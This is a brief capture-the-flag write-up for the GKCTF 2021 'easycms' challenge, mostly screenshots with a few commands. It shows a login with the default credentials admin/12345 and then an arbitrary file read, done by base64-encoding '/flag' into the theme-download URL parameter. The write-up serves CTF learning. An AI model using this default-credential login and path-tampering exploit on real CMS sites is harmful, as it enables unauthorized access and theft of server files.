# [GKCTF 2021]easycms
![](<./img/Pasted image 20230210101327.png>)

![](<./img/Pasted image 20230210101401.png>)

```
/
```

![](<./img/Pasted image 20230210101513.png>)

```
/admin.php
```

![](<./img/Pasted image 20230210102927.png>)

```
username: admin
password: 12345
```

![](<./img/Pasted image 20230210103418.png>)

![](<./img/Pasted image 20230210104206.png>)

在主题页面下选择一个主题进行自定义，选择导出主题

```
/admin.php?m=ui&f=downloadtheme&theme=L3Zhci93d3cvaHRtbC9zeXN0ZW0vdG1wL3RoZW1lL2RlZmF1bHQvMTExLnppcA==
```

```shell
$ echo 'L3Zhci93d3cvaHRtbC9zeXN0ZW0vdG1wL3RoZW1lL2RlZmF1bHQvMTExLnppcA==' | base64 -d
/var/www/html/system/tmp/theme/default/111.zip
```

```shell
$ echo -n '/flag' | base64
L2ZsYWc=
```

```
/admin.php?m=ui&f=downloadtheme&theme=L2ZsYWc=
```

```shell
$ cat Downloads/flag.zip
flag{a8b78826-5f1e-4e1c-bc3e-879941863f8c}
```
